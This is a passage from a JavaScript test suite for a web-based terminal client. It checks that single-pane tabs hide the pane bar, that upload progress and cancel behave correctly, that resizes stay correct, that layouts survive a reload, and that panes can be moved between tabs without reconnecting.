  ok(!toolBtn(win, 'upload').disabled, 'enabled again once the transfer is over');
  // The session drops: disabled again.
  win.endSession(s, {badge: true});
  await until(() => toolBtn(win, 'upload').disabled, 500);
  ok(toolBtn(win, 'upload').disabled && toolBtn(win, 'download').disabled, 'disabled after the session ended');
  ok(st.xhrs.length >= 1, 'the upload really started');
  cleanup(env);
});

test('solo: a lone pane\'s upload shows its progress and a working cancel, for its own tab only', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !a || !b) { cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b);
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  ok(visibleAll(env, '.upload-progress').length === 0, 'no progress shown before an upload');
  const st = hangingXhr(win);
  win.handleUpload(a.id, {files: [{name: 'report.pdf', size: 1000}], value: ''});
  await until(() => visibleAll(env, '.upload-progress').length > 0, 500);
  let vis = visibleAll(env, '.upload-progress');
  ok(vis.length === 1, 'one upload progress is visible for the lone pane; got ' + vis.length);
  const pr = vis[0];
  await until(() => pr && /report\.pdf|\d+%/.test((pr.querySelector('.upload-progress-text') || {}).textContent || ''), 500);
  ok(!!pr && /report\.pdf|\d+%/.test((pr.querySelector('.upload-progress-text') || {}).textContent || ''),
     'it says what is being uploaded / how far; got ' + JSON.stringify(pr && (pr.querySelector('.upload-progress-text') || {}).textContent));
  const cancel = pr && pr.querySelector('.upload-progress-cancel');
  ok(!!cancel && !env.lay.hidden(cancel), 'its cancel button is visible');
  ok(!barShown(env, a), 'and the pane bar stays hidden (the progress is not shown by bringing it back)');
  ok(a.term.rows === 24, 'the terminal keeps its 24 rows during the upload; got ' + a.term.rows);
  // Another tab: its pane has no transfer, nothing shown there.
  clickTab(win, tabById(win, tB));
  await until(() => tabId(activeTab(win)) === tB, 500);
  await sleep(20);
  ok(visibleAll(env, '.upload-progress').length === 0, 'in the other tab, a\'s upload progress is not shown');
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  await until(() => visibleAll(env, '.upload-progress').length === 1, 500);
  vis = visibleAll(env, '.upload-progress');
  ok(vis.length === 1, 'back in A, the progress is shown again');
  const c2 = vis[0] && vis[0].querySelector('.upload-progress-cancel');
  if (c2) press(win, c2);
  await until(() => st.xhrs.some(x => x.aborted), 500);
  ok(st.xhrs.length === 1 && st.xhrs[0].aborted, 'cancel aborts the upload');
  ok(/cancel/i.test(((visibleAll(env, '.upload-progress')[0] || {}).textContent) || ''),
     'the visible banner says Cancelled; got ' + JSON.stringify(((visibleAll(env, '.upload-progress')[0] || {}).textContent) || ''));
  await until(() => !a.upload, 3000);
  await until(() => visibleAll(env, '.upload-progress').length === 0, 500);
  ok(visibleAll(env, '.upload-progress').length === 0, 'and then goes away');
  cleanup(env);
});

test('solo: the persistent / short-lived marker stays visible for a lone pane', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const a = await tConnect(win, 'a.host', {persistent: true});
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !a || !b) { cleanup(env); return; }
  const tA = tabOfPane(a);
  // B (short-lived) in front.
  await until(() => visibleAll(env, '.pane-tag.ephemeral').length >= 1 && visibleAll(env, '.pane-tag.persistent').length === 0, 500);
  ok(visibleAll(env, '.pane-tag.ephemeral').length >= 1, 'short-lived lone pane: a visible short-lived marker');
  ok(visibleAll(env, '.pane-tag.persistent').length === 0, 'and no visible persistent marker');
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  await until(() => visibleAll(env, '.pane-tag.persistent').length >= 1 && visibleAll(env, '.pane-tag.ephemeral').length === 0, 500);
  ok(visibleAll(env, '.pane-tag.persistent').length >= 1, 'persistent lone pane: a visible persistent marker');
  ok(visibleAll(env, '.pane-tag.ephemeral').length === 0, 'and no visible short-lived marker');
  ok(!barShown(env, a), 'without bringing the pane bar back');
  cleanup(env);
});

test('solo: a split whose login fails and is dismissed leaves the lone pane without a bar, at full height', async () => {
  const env = await mkTabEnv(TAB_PLAN([
    {action: 'connect', match: b => b.host === 'bad.host', response: {auth_failed: true, alive: false}},
  ]), null, S2);
  const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  needTools(win);
  await settled(win, a);
  win.splitPane(a.id, 'h');
  await until(() => !hidden($(win, 'ov')), 1000);
  $(win, 'iH').value = 'bad.host'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'nope';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await until(() => !hidden($(win, 'tmuxOv')) && /Authentication failed/.test($(win, 'tmTitle').textContent), 1000);
  clickBtn(win, 'tmCancel');
  await until(() => hidden($(win, 'tmuxOv')), 500);
  clickBtn(win, 'btnCancel');
  await until(() => hidden($(win, 'ov')), 500);
  await until(() => a.term.rows === 24 && !barShown(env, a), 1000);
  await sleep(300);
  ok(paneList(win).length === 1, 'one pane left');
  ok(!barShown(env, a) && toolsShown(env), 'no pane bar, actions in the top bar');
  ok(a.term.rows === 24, 'full height again: 24 rows; got ' + a.term.rows);
  ok(serverSize(env, 'sid-a.host') === '80x24', 'the server ends with 80x24; got ' + serverSize(env, 'sid-a.host'));
  cleanup(env);
});

test('solo: after a reload a one-pane tab has no bar and a split tab has both', async () => {
  const env1 = await mkTabEnv(TAB_PLAN(), null, S2); const w1 = env1.win;
  const a = await tConnect(w1, 'a.host');
  if (!needTabs(w1) || !a) { cleanup(env1); return; }
  const b1 = await tNewTab(w1, 'b1.host');
  const b2 = b1 && await tSplit(w1, b1, 'h', 'b2.host');
  if (!b2) { ok(false, 'setup'); cleanup(env1); return; }
  clickTab(w1, tabElOfPane(w1, a));
  await until(() => tabId(activeTab(w1)) === tabOfPane(a), 500);
  await sleep(50);
  const snap = snapshotStorage(w1);
  cleanup(env1);
  const env = await mkTabEnv(TAB_PLAN(), snap, S2); const win = env.win;
  await until(() => paneList(win).filter(p => p.sid).length === 3, 2000);
  const pa = paneList(win).find(p => p.host === 'a.host');
  const pb1 = paneList(win).find(p => p.host === 'b1.host');
  const pb2 = paneList(win).find(p => p.host === 'b2.host');
  if (!pa || !pb1 || !pb2) { ok(false, 'three panes restored'); cleanup(env); return; }
  ok(tabOfPane(pa) === tabId(activeTab(win)), 'A (one pane) is in front after the reload');
  await settled(win, pa);
  ok(!barShown(env, pa), 'its pane bar is not shown');
  ok(toolsShown(env), 'the pane actions are in the top bar');
  ok(pa.term.rows === 24, 'its terminal has 24 rows; got ' + pa.term.rows);
  ok(serverSize(env, 'sid-a.host') === '80x24', 'and the server has 80x24; got ' + serverSize(env, 'sid-a.host'));
  const ca = env.log.find(e => e.action === 'connect' && e.body && e.body.host === 'a.host');
  ok(!!ca && ca.body.cols === 80 && ca.body.rows === 24,
     'the restored lone pane connects at its full height, 80x24 (not 22 rows and a resize after); got ' +
     (ca ? ca.body.cols + 'x' + ca.body.rows : 'no connect'));
  ok(sizesSent(env, 'sid-a.host').every(x => x === '80x24'), 'and is never resized to the 22-row size; got ' + JSON.stringify(sizesSent(env, 'sid-a.host')));
  ok(env.log.filter(e => e.action === 'resize' && degenerate(e)).length === 0, 'no degenerate resize');
  clickTab(win, tabElOfPane(win, pb1));
  await until(() => tabId(activeTab(win)) === tabOfPane(pb1), 500);
  await until(() => !toolsShown(env), 500);
  ok(barShown(env, pb1) && barShown(env, pb2) && !toolsShown(env), 'the split tab shows both bars and no top-bar actions');
  cleanup(env);
});

// ---- Step 2, second round: trying to break it ----
test('solo (break): rapid split / close / split / close ends bar-less at full height, no degenerate size', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  await settled(win, a);
  const mark = env.log.length;
  for (let i = 0; i < 4; i++) {
    const b = await tSplit(win, a, i % 2 ? 'v' : 'h', 'r' + i + '.host');
    if (!b) { ok(false, 'split ' + i); break; }
    win.closePane(b.id);
    await until(() => !win.panes[b.id], 500);
  }
  await until(() => a.term.rows === 24, 1000);
  await sleep(300);
  ok(!barShown(env, a) && toolsShown(env), 'ends without a bar, actions in the top bar');
  ok(a.term.rows === 24 && serverSize(env, 'sid-a.host') === '80x24', 'ends 80x24 on both sides; term ' + a.term.rows + ' server ' + serverSize(env, 'sid-a.host'));
  const rs = sizesSent(env, 'sid-a.host', mark);
  ok(rs.length <= 8 && rs.every(x => x === '80x22' || x === '80x24'), 'only the two real sizes, at most one per change; got ' + JSON.stringify(rs));
  ok(env.log.slice(mark).filter(e => e.action === 'resize' && degenerate(e)).length === 0, 'no degenerate resize');
  cleanup(env);
});

test('solo (break): the bar flips while output floods: still one resize, output intact', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  await settled(win, a);
  const b = await tSplit(win, a, 'h', 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  await settled(win, a);
  const written = [];
  const w0 = a.term.write.bind(a.term);
  a.term.write = d => { written.push(typeof d === 'string' ? d : String.fromCharCode.apply(null, Array.from(d))); };
  const mark = env.log.length;
  let n = 0;
  const flood = setInterval(() => { for (let k = 0; k < 5; k++) win.handleOutputPayload(a, {data: b64(win, 'L' + (++n) + '\n'), alive: true}, a.sid); }, 1);
  await sleep(30);
  win.closePane(b.id);
  await until(() => a.term.rows === 24, 1000);
  await sleep(300);
  clearInterval(flood);
  a.term.write = w0;
  const rs = sizesSent(env, 'sid-a.host', mark);
  ok(rs.length === 1 && rs[0] === '80x24', 'one resize to 80x24 under flood; got ' + JSON.stringify(rs));
  ok(!barShown(env, a) && toolsShown(env), 'bar gone, actions in the top bar');
  const got = written.join('');
  let missing = 0;
  for (let i = 1; i <= n; i++) if (got.indexOf('L' + i + '\n') < 0) missing++;
  ok(n > 20 && missing === 0, 'all ' + n + ' flooded lines reached the terminal; missing ' + missing);
  cleanup(env);
});

test('solo (break): cancel a lone pane\'s upload, switch tabs at once, come back', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !needTools(win) || !b) { cleanup(env); return; }
  clickTab(win, tabElOfPane(win, a));
  await until(() => win.activeId === a.id, 500);
  const st = hangingXhr(win);
  win.handleUpload(a.id, {files: [{name: 'c.bin', size: 1000}], value: ''});
  await until(() => visibleAll(env, '.upload-progress').length === 1, 500);
  press(win, visibleAll(env, '.upload-progress')[0].querySelector('.upload-progress-cancel'));
  clickTab(win, tabElOfPane(win, b));
  await until(() => win.activeId === b.id, 500);
  ok(st.xhrs[0] && st.xhrs[0].aborted, 'the upload was aborted');
  ok(visibleAll(env, '.upload-progress').length === 0, 'B shows no progress of a\'s cancelled upload');
  ok(!toolBtn(win, 'upload').disabled, 'B\'s upload button is enabled (B is idle)');
  await until(() => !a.upload, 3000);
  clickTab(win, tabElOfPane(win, a));
  await until(() => win.activeId === a.id, 500);
  await sleep(20);
  ok(visibleAll(env, '.upload-progress').length === 0, 'back in A after the banner expired: nothing left over');
  ok(!toolBtn(win, 'upload').disabled && !toolBtn(win, 'download').disabled, 'A\'s buttons are enabled again');
  ok(!barShown(env, a) && a.term.rows === 24, 'no bar, 24 rows');
  // And a new upload works and shows again.
  win.handleUpload(a.id, {files: [{name: 'd.bin', size: 1000}], value: ''});
  await until(() => visibleAll(env, '.upload-progress').length === 1, 500);
  ok(visibleAll(env, '.upload-progress').length === 1 && st.xhrs.length === 2, 'a second upload starts and shows');
  win.cancelTransfer(a.id);
  cleanup(env);
});

test('solo (break): reload in the middle of an upload leaves no progress and usable buttons', async () => {
  const env1 = await mkTabEnv(TAB_PLAN(), null, S2); const w1 = env1.win;
  const a = await tConnect(w1, 'a.host');
  if (!needTabs(w1) || !a) { cleanup(env1); return; }
  hangingXhr(w1);
  w1.handleUpload(a.id, {files: [{name: 'm.bin', size: 1000}], value: ''});
  await until(() => !!a.upload, 500);
  const snap = snapshotStorage(w1);
  cleanup(env1);
  const env = await mkTabEnv(TAB_PLAN(), snap, S2); const win = env.win;
  await until(() => paneList(win).some(p => p.sid), 2000);
  const p = paneList(win)[0];
  if (!p || !needTools(win)) { cleanup(env); return; }
  await until(() => !toolBtn(win, 'upload').disabled, 500);
  ok(visibleAll(env, '.upload-progress').length === 0, 'no stale progress after the reload');
  ok(!toolBtn(win, 'upload').disabled, 'upload is enabled');
  ok(!barShown(env, p) && p.term.rows === 24, 'no bar, 24 rows');
  cleanup(env);
});

test('solo (break): a hidden tab drops from 2 panes to 1; shown, it is bar-less with one resize', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const a2 = a && await tSplit(win, a, 'h', 'a2.host');
  const b = a2 && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !b) { cleanup(env); return; }
  await settled(win, b);
  ok(a.lastSentRows === 24 - BAR, 'a settled at ' + (24 - BAR) + ' rows; got ' + a.lastSentRows);
  const mark = env.log.length;
  // A's tab is hidden; one of its panes goes (as when another browser tab signs out of the vault).
  win.closePane(a2.id);
  await until(() => !win.panes[a2.id], 500);
  await sleep(300);
  ok(tabId(activeTab(win)) === tabOfPane(b), 'B stays in front');
  ok(resizesFor(env, 'sid-a.host', mark).length === 0, 'nothing sent for the hidden pane; got ' + JSON.stringify(sizesSent(env, 'sid-a.host', mark)));
  ok(a.term.rows === 24 - BAR, 'the hidden terminal is not refitted; got ' + a.term.rows);
  ok(toolsShown(env) && !barShown(env, b), 'B\'s chrome is unchanged');
  clickTab(win, tabElOfPane(win, a));
  await until(() => a.term.rows === 24, 1000);
  await sleep(300);
  ok(!barShown(env, a) && toolsShown(env), 'shown: a has no bar, actions in the top bar');
  const rs = sizesSent(env, 'sid-a.host', mark);
  ok(rs.length === 1 && rs[0] === '80x24', 'exactly one resize, 80x24; got ' + JSON.stringify(rs));
  ok(env.log.slice(mark).filter(e => e.action === 'resize' && degenerate(e)).length === 0, 'no degenerate resize');
  cleanup(env);
});

test('solo (break): zoom on a lone pane fits the bar-less box, one resize per step', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  await settled(win, a);
  const f0 = a.term.options.fontSize;
  let mark = env.log.length;
  win.zoomIn();
  const k = f0 / (f0 + 2);
  const want = Math.floor(80 * k) + 'x' + Math.floor(24 * k);
  await until(() => a.term.cols + 'x' + a.term.rows === want, 1500);
  await sleep(300);
  ok(a.term.cols + 'x' + a.term.rows === want, 'zoomed in: ' + want + ' (the whole box, no bar); got ' + a.term.cols + 'x' + a.term.rows);
  let rs = sizesSent(env, 'sid-a.host', mark);
  ok(rs.length === 1 && rs[0] === want, 'one resize ' + want + '; got ' + JSON.stringify(rs));
  ok(!barShown(env, a) && toolsShown(env), 'no bar after the zoom');
  mark = env.log.length;
  win.zoomOut();
  await until(() => a.term.rows === 24, 1500);
  await sleep(300);
  rs = sizesSent(env, 'sid-a.host', mark);
  ok(a.term.rows === 24 && rs.length === 1 && rs[0] === '80x24', 'zoomed back: 80x24, one resize; got ' + JSON.stringify(rs));
  cleanup(env);
});

// =====================================================================
// Tabs (step 3): moving panes between tabs
// =====================================================================
// What the user sees: a pane can leave its split and become a tab of its
// own ("Move to new tab", or its bar dragged onto the strip), join
// another tab (its bar dropped on that tab: split right of that tab's
// active pane), and a whole tab can be dropped on an edge of a pane in
// the tab on screen, its layout landing beside that pane. Nothing of
// this reconnects, restarts or loses anything: same session, same
// terminal (scrollback), same typed keys, same upload.
//
// Hooks the tests use:
//   movePaneToNewTab(paneId)          the pane leaves its split (sibling
//                                     takes its space) and becomes a new
//                                     tab, shown, with the pane active.
//                                     A pane alone in its tab: no-op.
//   movePaneToTab(paneId, tabId)      the pane joins tab tabId as a
//                                     horizontal split (.split-h) right
//                                     of that tab's active pane; that tab
//                                     is shown. Its old tab goes when it
//                                     is left empty. Own tab: no-op.
//   mergeTabInto(tabId, paneId, side) side 'left'|'right'|'top'|'bottom':
//                                     tab tabId's whole layout is put
//                                     beside pane paneId (left/right ->
//                                     .split-h, top/bottom -> .split-v;
//                                     left/top = the merged layout first);
//                                     tab tabId disappears. A pane of tab
//                                     tabId itself: no-op.
//   .pane-bar [data-act="to-tab"]     "Move to new tab" button in every
//                                     pane bar (bars show only with 2+
//                                     panes). #paneTools must NOT offer an
//                                     enabled, visible [data-act="to-tab"]
//                                     (a lone pane is already its own tab).
//   Gestures                          plain mouse events, like the tab
//                                     reorder (not HTML5 drag-and-drop:
//                                     that is the file-upload channel):
//                                     mousedown (button 0) on a pane bar
//                                     outside its buttons, or on a tab;
//                                     mousemove with buttons=1 past a few
//                                     px; mouseup. The drop target is the
//                                     element under the pointer: the tests
//                                     dispatch on it AND answer
//                                     document.elementFromPoint with it.
//     pane bar -> #tabs (not on a tab) or #tabNew   = movePaneToNewTab
//     pane bar -> #tabs .tab[data-tab=X]             = movePaneToTab(X)
//     tab      -> a pane of the tab on screen, near an edge = mergeTabInto
//   .drop-zone-left|right|top|bottom  on the hovered .pane (or an element
//                                     inside it) while a tab is dragged
//                                     over it, before release; none left
//                                     anywhere after the drag ends.
// A pane bar's drag starting on the pane's .pane-label: that is where
// the user grabs a header.
// =====================================================================
const S3 = {barRows: BAR};
const moveFns = win => typeof win.movePaneToNewTab === 'function' && typeof win.movePaneToTab === 'function' &&
  typeof win.mergeTabInto === 'function';
function needMove(win) {
  const g = moveFns(win);
  ok(g, 'move hooks exist: movePaneToNewTab(paneId), movePaneToTab(paneId, tabId), mergeTabInto(tabId, paneId, side)');
  return g;
}
// Calls that would mean the pane's session was restarted or torn down.
const RESTART_FNS = ['connectPane', 'reconnectPane', 'closeStream', 'abortPoll', 'endSession', 'startOutput',
                     'beginSessionIO', '_destroyPane'];
function sessionSpy(win, ps) {
  const calls = [];
  RESTART_FNS.forEach(n => {
    const f = win[n];
    if (typeof f !== 'function') return;
    win[n] = function (x) {
      const hit = ps.find(p => x === p || x === p.id);
      if (hit) calls.push(n + '(' + hit.host + ')');
      return f.apply(this, arguments);
    };
  });
  ps.forEach(p => {
    ['reset', 'clear', 'dispose'].forEach(m => {
      const f = p.term[m];
      p.term[m] = function () { calls.push('term.' + m + '(' + p.host + ')'); return f ? f.apply(this, arguments) : undefined; };
    });
  });
  return calls;
}
const sessionCalls = (env, from) => env.log.slice(from).filter(e => e.action === 'connect' || e.action === 'disconnect')
  .map(e => e.action + ' ' + JSON.stringify(e.body && (e.body.host || e.body.session_id)));
// The structure of a tab, as text: (h a.host b.host) for a horizontal
// split of a over b, nested as it is in the DOM.
function shape(win, tid) {
  const root = tabRootById(win, tid);
  if (!root) return 'no root for ' + tid;
  const node = el => {
    if (el.classList.contains('pane')) {
      const p = win.panes[el.getAttribute('data-pane')];
      return p ? p.host : '?' + el.getAttribute('data-pane');
    }
    const dir = el.classList.contains('split-h') ? 'h' : el.classList.contains('split-v') ? 'v' : null;
    if (!dir) return null;
    const kids = Array.from(el.children).map(node).filter(Boolean);
    return '(' + dir + ' ' + kids.join(' ') + ')';
  };
  return Array.from(root.children).map(node).filter(Boolean).join(' ');
}
// The same from the saved manifest, per tab in strip order.
function savedShapes(win) {
  let m = null;
  try { m = JSON.parse(win.localStorage.getItem(win.storageKey('websh_panes')) || 'null'); } catch (e) {}
  if (!m || !Array.isArray(m.tabs)) return null;
  const node = n => !n ? '' : n.type === 'leaf' ? ((m.panes[n.pane] || {}).host || '?')
    : '(' + n.dir + ' ' + node(n.a) + ' ' + node(n.b) + ')';
  return {tabs: m.tabs.map(t => node(t.layout)), active: m.active};
}
const shapesNow = win => tabEls(win).map(t => shape(win, tabId(t)));
const zoneOf = p => {
  const sides = ['left', 'right', 'top', 'bottom'];
  const has = el => sides.filter(s => el.classList.contains('drop-zone-' + s));
  let z = has(p.el);
  p.el.querySelectorAll('*').forEach(e => { z = z.concat(has(e)); });
  return z.join(',');
};
const anyZone = win => win.document.querySelectorAll('.drop-zone-left,.drop-zone-right,.drop-zone-top,.drop-zone-bottom').length;
// Mouse gestures. The pointer is "over" `el`: events are dispatched on it
// and elementFromPoint answers with it.
function pointer(win) {
  const st = {over: null};
  win.document.elementFromPoint = () => st.over;
  win.document.elementsFromPoint = () => { const out = []; for (let e = st.over; e; e = e.parentElement) out.push(e); return out; };
  const fireAt = (el, type, x, y, buttons) => {
    st.over = el;
    el.dispatchEvent(new win.MouseEvent(type, {bubbles: true, cancelable: true, button: 0, buttons: buttons,
                                               clientX: x, clientY: y, view: win}));
  };
  return {
    down: (el, x, y) => fireAt(el, 'mousedown', x, y, 1),
    move: (el, x, y) => fireAt(el, 'mousemove', x, y, 1),
    up: (el, x, y) => fireAt(el, 'mouseup', x, y, 0),
    moveNoButton: (el, x, y) => fireAt(el, 'mousemove', x, y, 0),
  };
}
const centre = el => { const r = el.getBoundingClientRect(); return [r.left + r.width / 2, r.top + r.height / 2]; };
function edgePoint(el, side) {
  const r = el.getBoundingClientRect();
  const cx = r.left + r.width / 2, cy = r.top + r.height / 2;
  if (side === 'left') return [r.left + r.width * 0.05, cy];
  if (side === 'right') return [r.right - r.width * 0.05, cy];
  if (side === 'top') return [cx, r.top + r.height * 0.05];
  return [cx, r.bottom - r.height * 0.05];
}
const labelEl = p => p.el.querySelector('.pane-label') || barOf(p);
// Drag pane p's bar onto `target` (an element of the strip).
function dragPaneBar(win, p, target) {
  const m = pointer(win);
  const g = labelEl(p);
  const [x0, y0] = centre(g);
  m.down(g, x0, y0);
  m.move(g, x0 + 3, y0 + 3);
  m.move(win.document.querySelector('#tabs') || g, x0 + 40, y0 + 2);
  const [x1, y1] = centre(target);
  m.move(target, x1, y1 + 1);
  m.up(target, x1, y1 + 1);
}
// Drag tab tEl onto `side` of pane p.
function dragTabOnto(win, tEl, p, side, o) {
  const m = pointer(win);
  const [x0, y0] = centre(tEl);
  m.down(tEl, x0, y0);
  m.move(tEl, x0 + 2, y0 + 30);
  const [x, y] = edgePoint(p.el, side);
  const into = p.el.querySelector('.pane-term') || p.el;
  m.move(into, x, y);
  m.move(into, x + (side === 'right' ? -1 : 1), y);
  if (o && o.beforeUp) o.beforeUp();
  if (!(o && o.noUp)) m.up(into, x, y);
  return m;
}
async function splitTabEnv(win, hosts) {
  const a = await tConnect(win, hosts[0]);
  const b = a && await tSplit(win, a, 'h', hosts[1]);
  return [a, b];
}

test('move: "Move to new tab" takes the pane out of its split into a new tab, same session', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const urls = recordUrls(win);
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !a || !b) { cleanup(env); return; }
  await settled(win, a); await settled(win, b);
  const tA = tabOfPane(a);
  ok(barShown(env, a) && barShown(env, b), 'setup: two panes in one tab, both with a bar');
  const btn = barOf(b) && barOf(b).querySelector('[data-act="to-tab"]');
  ok(!!btn && !env.lay.hidden(btn) && !btn.disabled, 'the pane bar has a visible, enabled "Move to new tab" button [data-act="to-tab"]');
  ok(!!btn && /tab/i.test((btn.title || '') + ' ' + (btn.getAttribute('aria-label') || '')),
     'it says what it does in its tooltip / aria-label; got ' + (btn ? JSON.stringify(btn.title + ' | ' + btn.getAttribute('aria-label')) : 'none'));
  if (!btn) { cleanup(env); return; }
  const mark = env.log.length;
  const spy = sessionSpy(win, [a, b]);
  const termB = b.term, elB = b.el;
  const f0 = b.term._focusCalls;
  const polls = () => urls.filter(u => /action=output/.test(u) && /sid-b\.host/.test(u)).length;
  press(win, btn);
  await until(() => tabEls(win).length === 2, 500);
  ok(tabEls(win).length === 2, 'two tabs now; got ' + tabEls(win).length);
  const tB = tabOfPane(b);
  ok(!!tB && tB !== tA, 'b is in a new tab, not in its old one');
  ok(tabId(activeTab(win)) === tB, 'the new tab is in front');
  ok(win.activeId === b.id, 'b is the active pane; got ' + win.activeId);
  ok(b.term._focusCalls > f0, 'keyboard focus went into b');
  ok(shape(win, tA) === 'a.host', 'a has the old tab to itself, no split left: ' + shape(win, tA));
  ok(shape(win, tB) === 'b.host', 'the new tab holds b alone: ' + shape(win, tB));
  ok(!a.el.style.flex, 'a takes the whole space (no leftover flex); got ' + JSON.stringify(a.el.style.flex));
  ok(win.panes[b.id] === b && b.el === elB && b.term === termB && !termB._disposed,
     'the same pane, element and terminal (scrollback kept)');
  ok(!!termB.element && elB.contains(termB.element), 'the terminal is still mounted in its pane');
  ok(b.sid === 'sid-b.host' && a.sid === 'sid-a.host', 'both sessions unchanged');
  ok(spy.length === 0, 'nothing was reconnected, restarted or reset; got ' + JSON.stringify(spy));
  const p0 = polls();
  await until(() => polls() >= p0 + 2, 1000);
  ok(polls() >= p0 + 2 && b.polling, 'b\'s output keeps flowing after the move');
  ok(sessionCalls(env, mark).length === 0, 'no /api/connect or /api/disconnect; got ' + JSON.stringify(sessionCalls(env, mark)));
  // Step 2: both tabs are one-pane tabs now.
  await sleep(300);
  ok(!barShown(env, b) && toolsShown(env), 'b, alone in its tab: no bar, the actions in the top bar');
  ok(tabLabel(tabById(win, tB)) === paneLabel(b), 'the new tab is labelled like b: ' + JSON.stringify(tabLabel(tabById(win, tB))));
  ok(tabLabel(tabById(win, tA)) === paneLabel(a), 'the old tab is labelled like a: ' + JSON.stringify(tabLabel(tabById(win, tA))));
  const smA = tabById(win, tA).querySelector('.tab-split');
  ok(!smA || env.lay.hidden(smA), 'the old tab lost its split marker');
  ok(dotState(tabById(win, tB)) === 's-on', 'the new tab\'s dot says connected; got ' + dotState(tabById(win, tB)));
  // One resize for b (bar gone: 22 -> 24 rows); none yet for a, hidden.
  let rb = sizesSent(env, 'sid-b.host', mark);
  ok(b.term.rows === 24 && rb.length === 1 && rb[0] === '80x24', 'b: one resize to 80x24; got ' + JSON.stringify(rb) + ', term ' + b.term.rows + ' rows');
  ok(sizesSent(env, 'sid-a.host', mark).length === 0, 'a, now in a hidden tab, is not resized while hidden; got ' + JSON.stringify(sizesSent(env, 'sid-a.host', mark)));
  clickTab(win, tabById(win, tA));
  await until(() => a.term.rows === 24, 1000);
  await sleep(300);
  const ra = sizesSent(env, 'sid-a.host', mark);
  ok(!barShown(env, a) && ra.length === 1 && ra[0] === '80x24', 'a, shown: no bar, one resize to 80x24; got ' + JSON.stringify(ra));
  ok(env.log.slice(mark).filter(e => e.action === 'resize' && degenerate(e)).length === 0, 'no degenerate resize');
  cleanup(env);
});

test('move: the move is saved at once; a reload restores both tabs and which one is in front', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !needMove(win) || !a || !b) { cleanup(env); return; }
  const c = await tNewTab(win, 'c.host');
  if (!c) { ok(false, 'setup'); cleanup(env); return; }
  clickTab(win, tabElOfPane(win, a));
  await until(() => win.activeId === a.id || win.activeId === b.id, 500);
  win.movePaneToNewTab(b.id);
  const saved = savedShapes(win);
  ok(!!saved && saved.tabs.length === 3, 'saved at once: three tabs in the manifest; got ' + JSON.stringify(saved));
  ok(!!saved && saved.tabs.indexOf('b.host') >= 0 && saved.tabs.indexOf('a.host') >= 0 && saved.tabs.indexOf('c.host') >= 0,
     'each pane in its own saved tab; got ' + JSON.stringify(saved && saved.tabs));
  ok(!!saved && saved.tabs[saved.active] === 'b.host', 'the saved active tab is b\'s; got ' + JSON.stringify(saved));
  const want = shapesNow(win);
  const snap = snapshotStorage(win);
  cleanup(env);
  const env2 = await mkTabEnv(TAB_PLAN(), snap, S3); const w2 = env2.win;
  await until(() => paneList(w2).filter(p => p.sid).length === 3, 2000);
  ok(JSON.stringify(shapesNow(w2)) === JSON.stringify(want), 'after reload the same tabs in the same order; got ' +
     JSON.stringify(shapesNow(w2)) + ' want ' + JSON.stringify(want));
  ok(activeTab(w2) && shape(w2, tabId(activeTab(w2))) === 'b.host', 'b\'s tab is in front again');
  cleanup(env2);
});

test('move: a pane alone in its tab offers no "Move to new tab", and the call changes nothing', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !needMove(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  const tb = toolBtn(win, 'to-tab');
  ok(!tb || env.lay.hidden(tb) || tb.disabled, 'the top-bar actions of a lone pane have no usable "Move to new tab"');
  await sleep(100);
  const mark = env.log.length;
  const before = shapesNow(win), saved0 = JSON.stringify(savedShapes(win));
  const spy = sessionSpy(win, [a, b]);
  win.movePaneToNewTab(b.id);
  win.movePaneToNewTab(a.id);          // a lone pane in a hidden tab
  await sleep(200);
  ok(JSON.stringify(shapesNow(win)) === JSON.stringify(before), 'tabs unchanged; got ' + JSON.stringify(shapesNow(win)));
  ok(tabRoots(win).length === 2, 'no empty tab root left behind; got ' + tabRoots(win).length);
  ok(tabId(activeTab(win)) === tabOfPane(b) && win.activeId === b.id, 'b\'s tab still in front');
  ok(spy.length === 0 && env.log.slice(mark).filter(e => e.action !== 'output' && e.action !== 'input').length === 0,
     'nothing sent, nothing restarted; got ' + JSON.stringify(spy.concat(env.log.slice(mark).filter(e => e.action !== 'output').map(e => e.action))));
  ok(JSON.stringify(savedShapes(win)) === saved0, 'the saved layout is unchanged');
  // Its own tab, by the other hook: also nothing.
